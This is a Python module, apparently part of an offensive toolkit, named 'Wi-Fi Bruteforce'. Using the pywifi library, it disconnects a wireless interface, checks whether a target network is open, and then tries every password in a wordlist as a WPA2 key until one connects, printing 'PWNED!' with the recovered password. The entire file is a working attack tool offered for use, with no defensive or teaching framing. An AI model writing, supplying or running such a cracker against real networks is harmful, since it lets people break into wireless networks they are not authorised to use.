import pywifi
from pywifi import const
import time
import os

NAME = 'Wi-Fi Bruteforce'

def show_help():
    pass
def execute(args):
    try:
        if args['show_help'] == 1:
            show_help()
            return
    except KeyError:
        pass

    wifi = pywifi.PyWiFi()

    print("\n[*] Selected interface: '" + str(args['interface']) + "'.")

    iface_index = args['interface']
    iface = wifi.interfaces()[iface_index]

    print('[*] Disconnecting from network...')

    iface.disconnect()
    time.sleep(5)

    if iface.status() == const.IFACE_CONNECTED:
        print("[!] Failed to disconnect interface '" + str(args['interface']) + "'!")
        return -1
    
    print("\n[*] Checking if network '" + args['ssid'] + "' is an open network...")

    profile = pywifi.Profile()
    profile.ssid = args['ssid']
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_NONE)

    iface.remove_all_network_profiles()
    profile = iface.add_network_profile(profile)

    iface.connect(profile)
    time.sleep(5)

    if iface.status() == const.IFACE_CONNECTED:
        print("[!] Network '" + args['ssid'] + "' has no password (Open Network).")
        return -1

    result = -1

    print("\n[*] Loading wordlist at path '" + args['wordlist_path'] + "'...")

    if (os.path.isfile(args['wordlist_path']) == False):
        print("\n[!] No wordlist found at path '" + args['wordlist_path'] + "'.")
        return -1
    
    print("[+] Found wordlist at path '" + args['wordlist_path'] + "'!")

    print("\n[*] Cracking network '" + args['ssid'] + "'... (Press Cmd/Ctrl + C to abort)")
    with open(args['wordlist_path'], 'r') as wordlist:
        while line := wordlist.readline():
            try:
                current_key = line.strip()
                print ("\n[*] Trying key '" + current_key + "'...")

                profile = pywifi.Profile()
                profile.ssid = args['ssid']
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                profile.cipher = const.CIPHER_TYPE_CCMP
                profile.key = current_key

                iface.remove_all_network_profiles()
                profile = iface.add_network_profile(profile)

                iface.connect(profile)
                time.sleep(5)
                if iface.status() == const.IFACE_CONNECTED:
                    print("[+] PWNED! Password of network '" + args['ssid'] + "' is '" + current_key + "'.")
                    result = 0
                    break
            except KeyboardInterrupt:
                print("[!] Aborted.")
                return -1

        if result == -1:
            print("[!] Couldn't find password of network '" + args['ssid'] + "'. Maybe try a different wordlist?")
    
    return result